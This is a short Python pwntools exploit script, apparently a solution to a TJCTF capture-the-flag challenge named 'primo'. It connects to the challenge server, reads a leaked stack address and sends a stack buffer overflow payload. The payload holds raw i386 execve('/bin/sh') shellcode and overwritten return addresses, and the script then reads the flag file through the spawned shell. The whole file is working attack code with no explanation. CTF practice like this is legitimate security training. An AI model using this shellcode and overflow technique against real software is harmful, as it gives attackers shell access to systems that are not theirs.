#!/usr/bin/env python2
from pwn import *
context(arch='i386', os='linux')
context.terminal = ['zsh', '-e', 'sh', '-c']

def pwn():

    #io = process('./primo')
    io = remote('p1.tjctf.org', 8011)
    io.recvuntil('hint:')
    stack_base = int(io.recv().strip(), 16)
    info("stack_base=%#x", stack_base)

    shellcode = '\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x00'
    info("shellcode_len=%d", len(shellcode))

    payload = shellcode
    payload += (0x30 - len(shellcode) - 16) * 'A'
    payload += p32(stack_base + 0x30 - 8)
    payload += p32(stack_base)    
    io.sendline(payload)
    io.sendline('cat flag.txt')
    print(io.recv())
    #io.interactive()

if __name__ == '__main__':
    pwn()